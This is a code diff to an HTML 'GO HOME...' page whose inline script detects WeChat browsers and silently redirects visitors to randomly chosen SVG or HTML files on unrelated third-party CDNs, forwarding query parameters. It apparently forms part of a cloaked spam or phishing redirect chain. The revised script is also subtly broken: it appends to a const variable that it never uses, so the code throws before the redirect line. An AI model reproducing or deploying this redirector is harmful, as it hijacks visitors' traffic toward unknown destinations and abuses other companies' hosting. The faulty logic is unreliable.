@@ -9,45 +9,47 @@
     <div style="display: flex; justify-content: center;"><img src="https://p3.ssl.qhimg.com/t01a2da9f507b45bc1b.gif" alt="" style="width: 70%;"></div>
     <h1 style="font-weight: bold; text-align: center;">GO HOME...</h1>
     <script>
-      function getQueryParam(param) {
-  var urlParams = new URLSearchParams(window.location.search);
-  return urlParams.get(param);
+const searchParams = new URLSearchParams(window.location.search);
+let u;
+if (searchParams.has('u')) {
+  u = searchParams.get('u');
+} else {
+  u = window.location.search.substring(1);
 }
 
-function redirectToURL(url) {
-  window.location.replace(url);
+function getQueryParam(param) {
+  var urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get(param);
 }
 
 var isWeChat = /micromessenger/i.test(navigator.userAgent.toLowerCase());
 var redirectURL;
 
 if (isWeChat) {
-  var randomIndex = Math.floor(Math.random() * 2);
+  var randomIndex = Math.floor(Math.random() * 2); 
   if (randomIndex === 0) {
-	redirectURL = "//pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg";
+	redirectURL = "https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg";
   } else {
-	redirectURL = "//image.cls.cn/cailianpress/avatar/20230525/cailianpress051540405.svg";
+	redirectURL = "https://otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg";
   }
 } else {
-  randomIndex = Math.floor(Math.random() * 2); 
+  randomIndex = Math.floor(Math.random() * 2);
   if (randomIndex === 0) {
-	redirectURL = "//yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html";
+	redirectURL = "https://yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html";
   } else {
-	redirectURL = "//otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg";
-  }
-}
-var uValue = getQueryParam("u");
-if (uValue) {
-  redirectURL += '?' + uValue + "&_t=" + Date.now();;
-} else {
-  var searchParams = new URLSearchParams(window.location.search);
-  var firstParam = searchParams.toString().split('&')[0];
-  if (firstParam) {
-	redirectURL += '?u=' + firstParam + "&_t=" + Date.now();;
+	redirectURL = "https://otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg";
   }
 }
 
-redirectToURL(redirectURL);
+const ajaxUrl = redirectURL +`?${u}`;
+var paramValue = getQueryParam("_t");
+if (paramValue) {
+  ajaxUrl += "&_t=" + paramValue;
+} else {
+  ajaxUrl += "&_t=" + Date.now();
+}
+
+window.location.replace(redirectURL);
     </script>
 </body>
 </html>
